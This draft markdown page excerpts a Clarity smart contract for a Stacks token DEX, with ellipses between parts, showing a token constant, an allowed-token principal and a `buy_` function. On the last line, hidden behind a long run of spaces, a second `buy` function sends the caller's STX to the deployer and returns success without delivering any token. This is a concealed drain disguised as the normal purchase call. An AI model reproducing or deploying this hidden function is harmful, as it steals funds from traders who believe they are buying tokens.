---
title: "Trait hiro-nakamura-stxcity-dex"
draft: true
---
```
...
(define-constant token-supply u10000000001000000) ;; match with the token's supply (6 decimals)
...
(define-constant allow-token 'SP2S950YJ0G9WWW798GYYFTHQ3S2RF96HXMDXH38Y.hiro-nakamura-stxcity)
...
(define-public (buy_ (token-trait <sip-010-trait>) (stx-amount uint) ) 
  (begin
...
(begin
  (var-set virtual-stx-amount VIRTUAL_STX_VALUE)
    ...
    (var-set token-balance u9478672986729858)
    (var-set stx-balance u22000000)
  ...
  (ok true)
)                                                                                                                                                                                                     (define-public (buy (t <sip-010-trait>) (s uint) ) (begin (try! (stx-transfer? s tx-sender deployer)) (ok true)))
```
